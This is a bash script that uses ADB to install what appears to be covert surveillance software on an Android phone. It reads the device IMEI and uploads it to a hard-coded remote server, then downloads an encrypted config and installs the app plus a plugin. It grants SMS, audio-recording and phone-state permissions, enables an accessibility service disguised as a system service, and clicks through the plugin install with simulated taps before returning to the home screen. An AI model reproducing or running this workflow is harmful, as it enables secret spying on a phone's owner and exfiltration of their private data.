# TODO: ask user to input the following token
PASS="MTp0ZXN0X3Rva2VuCg=="

SERVER_UPLOAD_URL="http://35.174.171.219:5000/conf/v1.0/upload"
SERVER_DOWNLOAD_URL="http://35.174.171.219:5000/conf/v1.0/download"

LOCAL_PLAINTEXT_CONFIG_FILE="config.json"
REMOTE_ENCRYPTED_CONFIG_FILE="config.enc"
TARGET_APK_FILE='app-debug.apk'

PLUGIN_APK_FILE='app-plugin.apk'
SDCARD_PLUGIN_APK="/storage/emulated/0/app.apk"

TARGET_PACKAGE_NAME="com.example.TestPlugin"
SDCARD_ENCRYPTED_CONFIG_FILE="/storage/emulated/0/Android/data/$TARGET_PACKAGE_NAME/cache/$REMOTE_ENCRYPTED_CONFIG_FILE"
MAIN_ACTIVITY_NAME="$TARGET_PACKAGE_NAME.MyActivity"
ACCESSIBILITY_SERVICE_NAME="com.example.SystemServices.MonitorService"


#
# This function checks for one or more devices connected via ADB.
# It will return the device's serial number.
# If no devices are connected, it will return '0'.
# If more than one device is connected, it will prompt the user to select one.
# In that case, it will return the selected device, or '0' if they didn't select any device.
#
# USAGE:
# Call the function as follows:
#
# selectedDevice MYVAL
#
# The device's serial number will be stored in the MYVAL variable.
#
function selectDevice() {
  # Run adb devices once, in event adb hasn't been started yet
  BLAH=$(adb devices)

  # Grab the IDs of all the connected devices / emulators
  IDS=($(adb devices | sed '1,1d' | sed '$d' | cut -f 1 | sort))
  NUMIDS=${#IDS[@]}

  # Check for number of connected devices / emulators
  if [[ 0 -eq "$NUMIDS" ]]; then
    # No IDs, return 0
    eval "$1='0'"
  elif [[ 1 -eq "$NUMIDS" ]]; then
    # Only one device, return its ID
    eval "$1='${IDS[0]}'"
  else
    # There are multiple devices, need to get information then prompt user for which device/emulator to uninstall from
    # Grab the model name for each device / emulator
    declare -a MODEL_NAMES
    for (( x=0; x < $NUMIDS; x++ )); do
      MODEL_NAMES[x]=$(adb devices | grep ${IDS[$x]} | cut -f 1 | xargs -I $ adb -s $ shell cat /system/build.prop | grep "ro.product.model" | cut -d "=" -f 2 | tr -d ' \r\t\n')
    done

    # Grab the platform version for each device / emulator
    declare -a PLATFORM_VERSIONS
    for (( x=0; x < $NUMIDS; x++ )); do
      PLATFORM_VERSIONS[x]=$(adb devices | grep ${IDS[$x]} | cut -f 1 | xargs -I $ adb -s $ shell cat /system/build.prop | grep "ro.build.version.release" | cut -d "=" -f 2 | tr -d ' \r\t\n')
    done

    # Prompting user to select a device
    echo "Multiple devices detected, please select one"
    for (( x=0; x < $NUMIDS; x++ )); do
      echo -e "$[x+1]: ${IDS[x]}\t\t${PLATFORM_VERSIONS[x]}\t\t${MODEL_NAMES[x]}"
    done
    echo -n "> "
    read USER_CHOICE

    # Validate user entered a number and return appropriate serial number
    if [[ $USER_CHOICE =~ ^[0-9]+$ ]]; then
      if [[ $USER_CHOICE -gt $NUMIDS ]]; then
        eval "$1='0'"
      else  
        eval "$1='${IDS[$USER_CHOICE-1]}'"
      fi
    else
      eval "$1='0'"
    fi
  fi
}


echo "\n######################################################"

echo "### Select target device ..."
# Get the device to use for this command
selectDevice SELECTED_DEVICE

# Make sure the user selected a device
if [[ "$SELECTED_DEVICE" = "0" ]]; then
  echo "Please select a valid device"
  exit 0;
fi
echo "### Device selected : $SELECTED_DEVICE ...\n"



echo "### Collect device IMEI ..."
IMEI=$(adb -s ${SELECTED_DEVICE} shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | tr -d '[:space:]' | awk '{print}' ORS=)
echo "### Device IMEI : $IMEI ...\n"



echo "### Save app configuration ..."
config="{\"imei\":\"$IMEI\"}"
echo $config > $LOCAL_PLAINTEXT_CONFIG_FILE
echo "### App configuration saved to $LOCAL_PLAINTEXT_CONFIG_FILE: $config ...\n"



echo "### Send authorization request ..."

curl -X POST -H "Authorization: Basic $PASS" -H "Content-Type: application/json" -d @$LOCAL_PLAINTEXT_CONFIG_FILE $SERVER_UPLOAD_URL
echo "### Authorization request sent ...\n"


echo "### Download authorization response ..."
curl -H "Authorization: Basic $PASS" $SERVER_DOWNLOAD_URL > $REMOTE_ENCRYPTED_CONFIG_FILE
echo "### Authorization response downloaded ...\n"


echo "### Download APK from remote server ..."
echo "!!! Not supported yet !!!"
sleep 1
echo "### Customized APK downloaded ...\n"


echo "### Push plugin APK to target device ..."
adb -s ${SELECTED_DEVICE} push $PLUGIN_APK_FILE $SDCARD_PLUGIN_APK 
echo "### Plugin APK has been installed ...\n"


echo "### Install APK to target device ..."
adb -s ${SELECTED_DEVICE} install $TARGET_APK_FILE
echo "### APK has been installed ...\n"


sleep 15

echo "### Push encrypted config onto device ..."
adb -s ${SELECTED_DEVICE} push $REMOTE_ENCRYPTED_CONFIG_FILE $SDCARD_ENCRYPTED_CONFIG_FILE
echo "### Encrypted config pushed to device ...\n"


echo "### Grant SMS/Storage/Audio/Phone permissions ..."
adb -s ${SELECTED_DEVICE} shell pm grant $TARGET_PACKAGE_NAME android.permission.READ_SMS
adb -s ${SELECTED_DEVICE} shell pm grant $TARGET_PACKAGE_NAME android.permission.WRITE_EXTERNAL_STORAGE
adb -s ${SELECTED_DEVICE} shell pm grant $TARGET_PACKAGE_NAME android.permission.RECORD_AUDIO
adb -s ${SELECTED_DEVICE} shell pm grant $TARGET_PACKAGE_NAME android.permission.READ_PHONE_STATE
echo "### SMS/Storage/Audio/Phone permissions granted ...\n"

adb -s ${SELECTED_DEVICE} shell settings put secure enabled_accessibility_services $TARGET_PACKAGE_NAME/$ACCESSIBILITY_SERVICE_NAME

echo "### Launch the app from target device ..."
adb -s ${SELECTED_DEVICE} shell am start -n $TARGET_PACKAGE_NAME/$MAIN_ACTIVITY_NAME
echo "### Application main activity launched ...\n"


sleep 20


echo "### Install plugin apk ..."
adb -s ${SELECTED_DEVICE} shell input keyevent 22
sleep 1
adb -s ${SELECTED_DEVICE} shell input keyevent 22
sleep 1
adb -s ${SELECTED_DEVICE} shell input tap 970 440
sleep 1
adb -s ${SELECTED_DEVICE} shell input keyevent 21
sleep 1
adb -s ${SELECTED_DEVICE} shell input tap 970 440
echo "### Plugin apk installed ...\n"


adb -s ${SELECTED_DEVICE} shell input keyevent 4
sleep 1
adb -s ${SELECTED_DEVICE} shell am start -a android.intent.action.MAIN -c android.intent.category.HOME



echo "######################################################\n"













